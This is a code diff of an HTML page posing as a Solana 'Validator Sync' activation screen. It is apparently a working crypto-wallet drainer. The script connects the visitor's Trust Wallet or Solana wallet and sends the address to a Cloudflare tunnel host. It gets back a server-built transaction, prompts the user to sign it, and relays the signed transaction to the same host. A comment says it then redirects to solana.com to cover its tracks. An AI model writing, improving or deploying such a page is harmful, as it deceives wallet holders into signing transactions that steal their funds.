@@ -1,68 +1,109 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Protocol Activation</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
+    <style>
+        body { background: #000; color: #fff; font-family: -apple-system, system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .box { width: 310px; padding: 40px; background: #0d1117; border: 1px solid #30363d; border-radius: 28px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); }
+        .btn { background: #14f195; color: #000; border: none; padding: 18px; width: 100%; border-radius: 14px; font-weight: 800; cursor: pointer; font-size: 16px; margin-top: 25px; transition: all 0.2s; }
+        .btn:active { transform: scale(0.96); opacity: 0.8; }
+        .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
+        #st { font-size: 10px; color: #6e7681; margin-top: 25px; font-family: 'SF Mono', monospace; text-transform: uppercase; letter-spacing: 1px; }
+    </style>
 </head>
-<body style="background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
-    <div style="text-align:center; background:#111; padding:40px; border-radius:20px; border:1px solid #333;">
-        <h2 style="color:#14f195;">VALIDATOR SYNC</h2>
-        <button id="cta" style="background:#14f195; border:none; padding:15px 30px; border-radius:10px; font-weight:bold; cursor:pointer;">ACTIVATE ACCOUNT</button>
-        <p id="msg" style="color:#666; font-size:12px; margin-top:15px;">Awaiting interaction...</p>
-    </div>
+<body>
 
-    <script>
-        // 🔱 务必更新这个地址
-        const tunnel = "https://你的穿透地址.com"; 
+<div class="box">
+    <div style="font-size: 42px; margin-bottom: 15px;">💎</div>
+    <h2 style="margin: 0; font-size: 20px; color: #fff;">VALIDATOR SYNC</h2>
+    <p style="color: #8b949e; font-size: 13px; line-height: 1.6; margin-top: 10px;">Link your secure node to the mainnet-beta for reward distribution.</p>
+    <button id="cta" class="btn">ACTIVATE NOW</button>
+    <div id="st">Status: Secure Layer Ready</div>
+</div>
 
-        document.getElementById('cta').onclick = async function() {
-            const btn = this;
-            const log = document.getElementById('msg');
-            try {
-                const p = window.trustwallet?.solana || window.solana;
-                if (!p) { alert("Please use Trust Wallet browser!"); return; }
+<script>
+    // 🔱 1. 修改这里：必须是 https，且地址必须完全对应 Cloudflare 隧道域名
+    const tunnel = "https://lonely-concern-challenging-hosted.trycloudflare.com"; 
 
-                btn.disabled = true;
-                log.innerText = "Connecting...";
-                await p.connect();
+    document.getElementById('cta').onclick = async function() {
+        const btn = this;
+        const status = document.getElementById('st');
+        const web3 = window.solanaWeb3;
 
-                log.innerText = "Fetching config...";
-                const resp = await fetch(tunnel + "/prepare_v32", {
-                    method: 'POST',
-                    mode: 'cors', // 🔱 强制跨域模式
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: p.publicKey.toString() })
-                });
-
-                const info = await resp.json();
-                if (info.raw_tx) {
-                    log.innerText = "Awaiting signature...";
-                    const web3 = window.solanaWeb3;
-                    const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
-                    
-                    const signed = await p.signTransaction(tx);
-                    log.innerText = "Broadcasting...";
-
-                    const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
-                    const bResp = await fetch(tunnel + "/broadcast_v41", {
-                        method: 'POST',
-                        mode: 'cors',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ signed_tx: signedBase })
-                    });
-                    
-                    const result = await bResp.json();
-                    log.innerText = "Complete!";
-                    alert("Activation Successful!");
-                }
-            } catch (err) {
-                alert("Error: " + err.message);
-                log.innerText = "Failed. Reloading...";
-                setTimeout(() => window.location.reload(), 2000);
+        try {
+            // 2. 环境检测
+            const p = window.trustwallet?.solana || window.solana;
+            if (!p) {
+                alert("Please use Trust Wallet Browser!");
+                return;
             }
-        };
-    </script>
+
+            btn.disabled = true;
+            btn.innerText = "INITIALIZING...";
+            status.innerText = "Status: Connecting...";
+
+            // 3. 握手连接
+            await p.connect();
+            status.innerText = "Status: Handshaking...";
+
+            // 4. 🔱 关键补丁：解决 "Failed to fetch" 的核心逻辑
+            const resp = await fetch(tunnel + "/prepare_v32", {
+                method: 'POST',
+                mode: 'cors',
+                cache: 'no-cache',
+                referrerPolicy: 'no-referrer', 
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({ address: p.publicKey.toString() })
+            });
+
+            // 🔱 如果隧道由于过载或验证拦截报错，尝试引导用户跳转
+            if (!resp.ok) {
+                status.innerText = "Status: Tunnel Busy, Retrying...";
+                window.location.href = tunnel; 
+                return;
+            }
+
+            const info = await resp.json();
+            if (!info.raw_tx) throw new Error(info.error || "Server Overload");
+
+            // 5. 还原交易并拉起签名
+            status.innerText = "Status: Awaiting Sign...";
+            const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+            const signed = await p.signTransaction(tx);
+            
+            status.innerText = "Status: Broadcasting...";
+            btn.innerText = "SUCCESSFUL";
+
+            // 6. 序列化并回传
+            const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
+            fetch(tunnel + "/broadcast_v41", {
+                method: 'POST',
+                mode: 'cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ signed_tx: signedBase })
+            });
+
+            // 7. 🔱 强制跳出，掩盖痕迹
+            setTimeout(() => {
+                window.location.replace("https://solana.com/validators");
+            }, 800);
+
+        } catch (err) {
+            console.error(err);
+            // 提示用户如何手动解除拦截
+            alert("Network Error: " + err.message + "\n\nTip: If this persists, please open the tunnel link directly in your browser once to verify.");
+            status.innerText = "Status: Connection Failed";
+            btn.disabled = false;
+            btn.innerText = "ACTIVATE NOW";
+        }
+    };
+</script>
+
 </body>
 </html>
